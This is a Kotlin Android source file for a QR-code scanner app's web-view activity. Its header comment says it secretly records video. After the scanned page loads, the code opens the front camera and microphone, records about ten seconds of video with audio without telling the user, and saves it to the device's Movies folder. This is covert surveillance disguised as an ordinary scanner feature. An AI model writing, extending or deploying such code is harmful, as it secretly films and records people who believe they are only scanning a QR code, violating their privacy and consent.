// WEB VIEW ACTIVITY TO DISPLAY THE WEB PAGE RELATED TO THE QR CODE AND SECRETLY RECORD A VIDEO

package com.zizou.qrcodescanner

import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

import android.Manifest
import android.content.ContentValues
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.ActivityCompat
import android.widget.Toast

class WebPageActivity : AppCompatActivity() {

    private lateinit var mediaRecorder: MediaRecorder
    private var isRecording = false
    private val recordingDuration = 10000 // 10 seconds
    private var cameraCaptureSession: CameraCaptureSession? = null
    private var cameraDevice: CameraDevice? = null

    // ----------- FUNCTIONS TO BROWSE THE WEB PAGE ---------------
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_web_page)


        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO), 101)
        } else {
            startWebView()
        }
    }

    private fun startWebView() {
        val webView: WebView = findViewById(R.id.webview)
        val newUrl = intent.getStringExtra("urlScanned") ?: "https://www.google.com/"

        webView.settings.javaScriptEnabled = true
        webView.loadUrl(newUrl)
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                setupCamera()
                Handler().postDelayed({ stopRecording() }, recordingDuration.toLong())
            }
        }
    }


    // ----------- FUNCTIONS TO RECORD THE VIDEO ---------------
    private fun setupCamera() {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) {
                    openCamera(cameraId, cameraManager)
                    break
                }
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    private fun openCamera(cameraId: String, cameraManager: CameraManager) {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        startRecording()
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                    }
                }, null)
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    private fun startRecording() {
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(getOutputUri()?.let { contentResolver.openFileDescriptor(it, "w")?.fileDescriptor })
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoSize(1920, 1080)
            setVideoFrameRate(60)
            prepare()
        }

        val recordingSurface = mediaRecorder.surface

        cameraDevice?.let { device ->
            val captureRequestBuilder = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                addTarget(recordingSurface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }

            val surfaces = listOf(recordingSurface)

            try {
                device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        cameraCaptureSession = session
                        try {
                            session.setRepeatingRequest(captureRequestBuilder.build(), null, null)
                            mediaRecorder.start()
                            isRecording = true
                        } catch (e: Exception) {
                            Log.e("WebPageActivity", "Error starting MediaRecorder", e)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e("WebPageActivity", "Failed to configure camera capture session")
                    }
                }, null)
            } catch (e: CameraAccessException) {
                Log.e("WebPageActivity", "Error accessing camera for capture session", e)
            }
        } ?: Log.e("WebPageActivity", "Camera device is null")
    }

    private fun stopRecording() {
        if (isRecording) {
            mediaRecorder.stop()
            mediaRecorder.release()
            cameraCaptureSession?.close()
            cameraDevice?.close()
            isRecording = false
        }
    }

    private fun getOutputUri(): Uri? {
        val contentValues = ContentValues().apply {
            put(MediaStore.MediaColumns.DISPLAY_NAME, "recorded_video.mp4")
            put(MediaStore.MediaColumns.MIME_TYPE, "video/mp4")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MOVIES)
            }
        }

        return contentResolver.insert(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, contentValues)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
            startWebView()
        } else {
            Toast.makeText(this, "Camera and Microphone permissions are required", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onPause() {
        super.onPause()
        if (isRecording) {
            stopRecording()
        }
    }
}